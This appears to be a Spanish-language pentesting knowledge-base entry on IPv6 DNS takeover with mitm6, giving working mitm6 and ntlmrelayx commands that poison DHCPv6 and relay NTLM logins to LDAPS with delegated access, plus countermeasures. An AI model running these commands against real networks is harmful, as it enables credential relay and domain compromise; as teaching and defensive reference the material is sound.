---
title: IPv6 DNS Takeover con mitm6
slug: explotacion-mitm6
aliases: [IPv6 DNS Takeover con mitm6, mitm6, IPv6 takeover, WPAD spoofing, DHCPv6 takeover]
fase: [Explotación]
plataforma: Red
dificultad: Avanzada
mitre: [T1557.001]
related: [explotacion-mitm-responder, explotacion-smb-relay, explotacion-adcs-relay]
learning_refs: []
---

# IPv6 DNS Takeover con mitm6

## Descripción
Técnica de ataque que aprovecha la configuración por defecto de Windows que prioriza IPv6 sobre IPv4. El atacante actúa como un servidor DHCPv6 malicioso, asignando direcciones IPv6 a las víctimas y configurándose a sí mismo como el servidor DNS primario, permitiendo interceptar y redirigir el tráfico hacia servidores de relay.

## Herramientas
- **mitm6** (`-d`, `-i`) — herramienta que automatiza el envenenamiento de DHCPv6.
- **ntlmrelayx.py** (`-6`, `-wh`) — para realizar el relay de las autenticaciones interceptadas vía IPv6.
- **wireshark** — para monitorear el tráfico ICMPv6 y DHCPv6 en la red.

## Comandos / Ejemplos

### Ejecución del ataque combinado
```bash
# 1. Ejecutar mitm6 filtrando por el dominio objetivo
sudo mitm6 -d internal.corp -i eth0

# 2. En otra terminal, configurar ntlmrelayx para recibir el tráfico
# -wh: especifica un host WPAD falso para forzar autenticación
sudo ntlmrelayx.py -6 -t ldaps://192.168.1.10 -wh attacker-v6-host --delegate-access
```

### Intercepción de tráfico HTTP
```bash
# mitm6 causará que las máquinas busquen recursos vía IPv6
# ntlmrelayx capturará estas peticiones y realizará el relay
```

## Contramedidas
- Deshabilitar IPv6 en toda la red si no se utiliza activamente.
- Implementar "DHCPv6 Guard" en los switches de la infraestructura.
- Configurar el firmado de LDAP y SMB para mitigar ataques de relay.
- Monitorizar la red en busca de anuncios de router (Router Advertisements) no autorizados.

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1557: Adversary-in-the-Middle. https://attack.mitre.org/techniques/T1557/
